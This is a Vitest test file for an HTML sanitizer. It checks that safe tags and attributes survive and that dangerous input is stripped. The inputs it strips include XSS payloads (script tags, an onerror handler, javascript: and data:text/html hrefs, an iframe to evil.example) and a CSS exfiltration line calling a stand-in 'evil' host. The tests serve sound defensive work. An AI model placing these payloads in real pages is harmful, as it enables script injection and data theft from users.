import { describe, expect, it } from "vitest";
import { escapeHtml, sanitizeHtml } from "./sanitizeHtml";

describe("sanitizeHtml — allows", () => {
  it("keeps <details> and <summary>", () => {
    const out = sanitizeHtml(
      "<details><summary>Click</summary>Hidden</details>",
    );
    expect(out).toContain("<details>");
    expect(out).toContain("<summary>");
    expect(out).toContain("Hidden");
  });

  it("preserves class, id, data-*, aria-*", () => {
    const out = sanitizeHtml(
      '<div class="hero" id="top" data-foo="bar" aria-label="Hero">x</div>',
    );
    expect(out).toContain('class="hero"');
    expect(out).toContain('id="top"');
    expect(out).toContain('data-foo="bar"');
    expect(out).toContain('aria-label="Hero"');
  });

  it("keeps inline text tags including <em>, <b>, <i>, <strong>", () => {
    const out = sanitizeHtml(
      "<p><em>e</em> <b>b</b> <i>i</i> <strong>s</strong> <sub>u</sub> <kbd>K</kbd> <mark>m</mark></p>",
    );
    expect(out).toContain("<em>e</em>");
    expect(out).toContain("<b>b</b>");
    expect(out).toContain("<i>i</i>");
    expect(out).toContain("<strong>s</strong>");
    expect(out).toContain("<sub>u</sub>");
    expect(out).toContain("<kbd>K</kbd>");
    expect(out).toContain("<mark>m</mark>");
  });

  it("preserves a balanced inline run that mixes text and tags", () => {
    // The exact case that broke before: <em>italic</em> arriving as
    // one concatenated string sanitizes cleanly.
    const out = sanitizeHtml("before <em>italic</em> after");
    expect(out).toBe("before <em>italic</em> after");
  });
});

describe("sanitizeHtml — strips", () => {
  it("removes <script>", () => {
    const out = sanitizeHtml("<p>safe</p><script>alert(1)</script>");
    expect(out).not.toContain("script");
    expect(out).toContain("safe");
  });

  it("strips inline event handlers", () => {
    const out = sanitizeHtml('<img src="x" onerror="alert(1)">');
    expect(out).not.toContain("onerror");
  });

  it("strips javascript: hrefs", () => {
    const out = sanitizeHtml('<a href="javascript:alert(1)">x</a>');
    expect(out).not.toMatch(/href=/i);
  });

  it("strips data:text/html hrefs", () => {
    const out = sanitizeHtml(
      '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    );
    expect(out).not.toMatch(/href=/i);
  });

  it("removes <style>", () => {
    const out = sanitizeHtml("<style>body{display:none}</style><p>ok</p>");
    expect(out).not.toContain("<style");
    expect(out).toContain("ok");
  });

  it("removes <iframe>", () => {
    const out = sanitizeHtml('<iframe src="https://evil.example"></iframe>');
    expect(out).not.toContain("iframe");
  });

  it("strips style attribute on raw HTML", () => {
    // CSS-based exfiltration via `background: url(https://evil/?…)` is
    // the threat. We don't bother with a granular CSS sanitizer — the
    // markdown renderer emits no user-controlled inline styles, so
    // dropping `style` wholesale costs nothing.
    const out = sanitizeHtml(
      '<div style="background:url(https://evil/?leak=1)">x</div>',
    );
    expect(out).not.toMatch(/style=/i);
    expect(out).not.toContain("evil");
    expect(out).toContain("x");
  });

  it("strips style attribute even with safe-looking values", () => {
    const out = sanitizeHtml('<p style="color:red">red</p>');
    expect(out).not.toMatch(/style=/i);
    expect(out).toContain("red");
  });
});

describe("escapeHtml", () => {
  it("escapes &, <, >, \", '", () => {
    expect(escapeHtml(`a & b < c > d "e" 'f'`)).toBe(
      "a &amp; b &lt; c &gt; d &quot;e&quot; &#39;f&#39;",
    );
  });
});
